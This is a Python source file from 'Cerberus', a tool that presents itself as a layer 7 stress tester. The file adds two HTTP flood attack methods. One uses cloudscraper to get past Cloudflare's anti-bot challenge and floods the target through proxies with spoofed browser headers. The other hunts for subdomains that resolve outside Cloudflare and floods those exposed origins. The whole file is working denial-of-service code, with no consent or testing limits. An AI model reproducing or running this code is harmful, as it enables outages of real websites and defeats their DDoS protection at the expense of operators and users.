'''

Cerberus, a layer 7 network stress testing tool that has a wide variety of normal and exotic attack vectors.
Copyright (C) 2022  Nexus/Nexuzzzz

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

'''

import time, requests, cloudscraper, socket

from src.core import Core
from src.utils import *
from src.useragent import *

# TODO: remove the junk called cloudscraper and use a different solution, such as https://github.com/vvanglro/cf_clearance

keyword = choice(keywords)
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': f'https://google.com?q={keyword}',
    'DNT': '1',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'TE': 'trailers'
}

def flood2(attack_id, url, stoptime) -> None:

    unprotected = []

    # TODO: speed this up using threads or multiprocessing

    # check if the target url is actually protected by cloudflare
    if not Core.cf_check_busy:
        while not Core.cf_check_done:
            Core.cf_check_busy = True

            if not utils().is_cloudflare_ip(socket.gethostbyname(urlparse(url).netloc)):
                # no cloudflare detected, just stop the attack
                Core.killattack = True
                return

            # we need to iterate over a subdomain list
            # and check if the domain exists
            for subdomain in subdomains:
                try:
                    host = f'{subdomain}.{urlparse(url).netloc}'
                    print(f'--> {host}')

                    if not utils().is_cloudflare_ip(socket.gethostbyname(host)):
                        print(f'Hit --> {host}')
                        # subdomain isn't protected by cloudflare!
                        unprotected.append(host)
                
                except Exception: # does not exist
                    continue
            
            Core.cf_check_done = True
    else:
        print('other thread is already working')
        while not Core.cf_check_busy: 
            # while another thread is still working on hunting for unprotected subdomains
            # we wait

            time.sleep(0.2)
            continue

    # check if we have any unprotected subdomains
    if len(unprotected) == 0:
        return

    while time.time() < stoptime and not Core.killattack:
        if not Core.attackrunning:
            continue

        for hostname in unprotected:

            url = f'http://{hostname}'

            try:
                Core.session.get(
                    utils().buildblock(url), 
                    headers=utils().buildheaders(url),
                    timeout=(5,0.1), 
                    allow_redirects=False,
                    stream=False,
                    cert=None,
                    proxies=utils().get_proxy()
                )

                Core.infodict[attack_id]['req_sent'] += 1
            except requests.exceptions.ReadTimeout:
                Core.infodict[attack_id]['req_sent'] += 1

            except Exception:
                Core.infodict[attack_id]['req_fail'] += 1

            Core.infodict[attack_id]['req_total'] += 1

    Core.threadcount -= 1

def flood(attack_id, url, stoptime) -> None:

    with cloudscraper.create_scraper() as session:
        while time.time() < stoptime and not Core.killattack:
            if not Core.attackrunning:
                continue
            
            try:

                req = session.get(
                    url, 
                    headers=headers,
                    timeout=(5,0.1), 
                    allow_redirects=False,
                    stream=False,
                    cert=None,
                    proxies=utils().get_proxy()
                )

                if req.status_code == 403: # blocked
                    Core.infodict[attack_id]['req_fail'] += 1
                    break

                Core.infodict[attack_id]['req_sent'] += 1
            except requests.exceptions.ReadTimeout:
                Core.infodict[attack_id]['req_sent'] += 1
            
            except cloudscraper.exceptions.CloudflareChallengeError: # cloudscraper is unable to solve v2 challenges
                Core.infodict[attack_id]['req_fail'] += 1
                Core.killattack = True # no need to start a new thread to attack it

            except Exception:
                Core.infodict[attack_id]['req_fail'] += 1

            Core.infodict[attack_id]['req_total'] += 1

    Core.threadcount -= 1

Core.methods.update({
    'CLOUDFLARE': {
        'info': 'Cloudflare UAM/IUAM bypass using cloudscraper',
        'func': flood
    },

    'SUBDOMAIN': {
        'info': 'A Cloudflare bypass attack, which checks for unprotected subdomains',
        'func': flood2
    }
})